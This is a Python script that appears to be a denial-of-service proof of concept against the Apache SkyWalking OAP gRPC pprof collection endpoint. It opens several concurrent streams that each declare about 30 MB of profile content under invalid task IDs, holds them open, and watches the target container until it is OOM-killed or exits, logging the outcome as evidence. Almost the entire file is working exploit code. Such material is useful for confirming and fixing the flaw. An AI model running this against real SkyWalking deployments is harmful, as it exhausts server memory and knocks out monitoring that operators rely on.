#!/usr/bin/env python3
import argparse
import json
import os
import socket
import subprocess
import sys
import threading
import time
from pathlib import Path

import grpc

CASE_DIR = Path(__file__).resolve().parent
PROTO_PY = CASE_DIR / "evidence" / "proto_py"
os.environ.setdefault("TEMPORARILY_DISABLE_PROTOBUF_VERSION_CHECK", "true")
sys.path.insert(0, str(PROTO_PY))

from pprof import Pprof_pb2  # noqa: E402


def docker_json(args):
    try:
        out = subprocess.check_output(args, text=True, stderr=subprocess.STDOUT)
        return out.strip()
    except subprocess.CalledProcessError as exc:
        return exc.output.strip()


def docker_state(container):
    out = docker_json(["docker", "inspect", container, "--format", "{{json .State}}"])
    try:
        return json.loads(out)
    except json.JSONDecodeError:
        return {"error": out}


def docker_stats(container):
    out = docker_json([
        "docker",
        "stats",
        "--no-stream",
        "--format",
        "{{json .}}",
        container,
    ])
    try:
        return json.loads(out)
    except json.JSONDecodeError:
        return {"error": out}


def tcp_ready(host, port, timeout=2.0):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def make_stream(call, args, idx, release_event, ready_event, stop_event, results):
    service = f"dos-pprof-service-{idx}"
    instance = f"dos-pprof-instance-{idx}"
    metadata = Pprof_pb2.PprofMetaData(
        service=service,
        serviceInstance=instance,
        taskId=f"{args.task_id_prefix}-{idx}",
        type=Pprof_pb2.PPROF_PROFILING_SUCCESS,
        contentSize=args.content_size,
    )

    def request_iter():
        yield Pprof_pb2.PprofData(metadata=metadata)
        ready_event.set()
        release_event.wait(args.hold_seconds)
        if args.complete:
            return
        while not stop_event.is_set():
            time.sleep(0.5)

    start = time.time()
    entry = {
        "stream": idx,
        "content_size": args.content_size,
        "task_id": metadata.taskId,
        "response": None,
        "error": None,
        "elapsed_seconds": None,
    }
    try:
        responses = call(request_iter(), timeout=args.hold_seconds + args.rpc_timeout_slack)
        first = next(responses)
        entry["response"] = {"status": first.status, "status_name": Pprof_pb2.PprofProfilingStatus.Name(first.status)}
        release_event.wait(args.hold_seconds)
        responses.cancel()
    except Exception as exc:
        entry["error"] = repr(exc)
        try:
            responses.cancel()
        except Exception:
            pass
    finally:
        entry["elapsed_seconds"] = round(time.time() - start, 3)
        results[idx] = entry


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=19180)
    parser.add_argument("--http-port", type=int, default=19280)
    parser.add_argument("--container", default="sw-pprof-case-oap")
    parser.add_argument("--streams", type=int, default=4)
    parser.add_argument("--content-size", type=int, default=31457280)
    parser.add_argument("--hold-seconds", type=float, default=20.0)
    parser.add_argument("--stagger-seconds", type=float, default=0.2)
    parser.add_argument("--rpc-timeout-slack", type=float, default=15.0)
    parser.add_argument("--task-id-prefix", default="invalid-dos-pprof-task")
    parser.add_argument("--sample-interval", type=float, default=1.0)
    parser.add_argument("--complete", action="store_true")
    parser.add_argument("--out", required=True)
    args = parser.parse_args()

    started_at = time.time()
    out_path = Path(args.out)
    out_path.parent.mkdir(parents=True, exist_ok=True)

    channel = grpc.insecure_channel(f"{args.host}:{args.port}")
    grpc.channel_ready_future(channel).result(timeout=15)
    collect = channel.stream_stream(
        "/skywalking.v10.PprofTask/collect",
        request_serializer=lambda msg: msg.SerializeToString(),
        response_deserializer=Pprof_pb2.PprofCollectionResponse.FromString,
    )

    release_event = threading.Event()
    stop_event = threading.Event()
    ready_events = []
    results = {}
    threads = []
    samples = []

    baseline = {
        "grpc_tcp_ready": tcp_ready(args.host, args.port),
        "http_tcp_ready": tcp_ready(args.host, args.http_port),
        "state": docker_state(args.container),
        "stats": docker_stats(args.container),
    }

    try:
        for idx in range(args.streams):
            ev = threading.Event()
            ready_events.append(ev)
            thread = threading.Thread(
                target=make_stream,
                args=(collect, args, idx, release_event, ev, stop_event, results),
                daemon=True,
            )
            thread.start()
            threads.append(thread)
            time.sleep(args.stagger_seconds)

        ready_deadline = time.time() + 20
        while time.time() < ready_deadline and not all(ev.is_set() for ev in ready_events):
            time.sleep(0.1)

        sample_deadline = time.time() + args.hold_seconds
        while time.time() < sample_deadline:
            sample = {
                "t": round(time.time() - started_at, 3),
                "grpc_tcp_ready": tcp_ready(args.host, args.port, timeout=0.5),
                "http_tcp_ready": tcp_ready(args.host, args.http_port, timeout=0.5),
                "state": docker_state(args.container),
                "stats": docker_stats(args.container),
            }
            samples.append(sample)
            state = sample.get("state", {})
            if state.get("OOMKilled") or state.get("Status") in {"exited", "dead"}:
                break
            time.sleep(args.sample_interval)
    finally:
        release_event.set()
        stop_event.set()
        for thread in threads:
            thread.join(timeout=5)
        final = {
            "grpc_tcp_ready": tcp_ready(args.host, args.port),
            "http_tcp_ready": tcp_ready(args.host, args.http_port),
            "state": docker_state(args.container),
            "stats": docker_stats(args.container),
        }
        channel.close()

    payload = {
        "args": vars(args),
        "started_at_epoch": started_at,
        "duration_seconds": round(time.time() - started_at, 3),
        "baseline": baseline,
        "samples": samples,
        "stream_results": [results[k] for k in sorted(results)],
        "final": final,
    }
    out_path.write_text(json.dumps(payload, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    print(json.dumps({
        "out": str(out_path),
        "streams": args.streams,
        "content_size": args.content_size,
        "duration_seconds": payload["duration_seconds"],
        "final_state": final.get("state", {}),
    }, sort_keys=True))


if __name__ == "__main__":
    main()
